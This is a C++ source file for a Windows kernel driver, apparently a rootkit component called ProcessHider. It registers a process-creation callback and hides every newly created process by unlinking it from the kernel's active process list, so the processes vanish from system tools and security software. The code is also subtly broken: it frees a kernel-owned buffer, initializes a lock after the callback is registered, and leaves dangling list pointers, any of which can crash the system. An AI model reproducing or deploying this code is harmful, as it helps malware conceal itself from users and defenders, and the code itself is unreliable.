#include "ProcessHider.h"

#include <ntddk.h>

#pragma warning( disable : 4302 4311 )

namespace filter
{

	NTSTATUS ProcessHider::Register()
	{
		ProcessHider::HideOnInitializeOperation();
		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);

		if (!NT_SUCCESS(status)) 
		{
			ProcessHider::Unload();
		}

		KeInitializeGuardedMutex(&process_lock_);

		return status;
	}

	void ProcessHider::Unload()
	{
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
	}

	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
	{
		return false;
	}

	void ProcessHider::HideOnInitializeOperation()
	{
		
	}

	void ProcessHider::HideOnCreateOperation(P_CUSTOM_EPROCESS peprocess, HANDLE pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		WCHAR msg[500] = { 0 };
		WCHAR name[500] = { 0 };

		if (create_info != NULL)
		{
			PUNICODE_STRING process_name = (PUNICODE_STRING)create_info->ImageFileName;
			
			int size = process_name->Length / 2;
			int ans = -1;
			for (int i = size - 1; i >= 0; i--)
			{
				if (process_name->Buffer[i] == WCHAR(L'\\'))
				{
					ans = i;
					break;
				}
			}

			int mem_size = (size - (ans+1)) * 2;
			RtlCopyMemory(name, &process_name->Buffer[ans+1], mem_size);
			DebugMessage("Process created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);

			if (HideProcess(peprocess) == true)
			{
				DebugMessage("Hide oke");
			}
			
			ExFreePool(process_name->Buffer);
		}
	}


	bool ProcessHider::HideProcess(P_CUSTOM_EPROCESS peprocess)
	{

		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;

		KIRQL  new_irql = DISPATCH_LEVEL;
		KIRQL old_irql = DISPATCH_LEVEL;

		KeAcquireGuardedMutex(&process_lock_);

		cur_p_eprocess = (P_CUSTOM_EPROCESS)(PVOID)peprocess;

		pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
		next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
		pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
		next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
			
		KeReleaseGuardedMutex(&process_lock_);

		return true;
	}

}
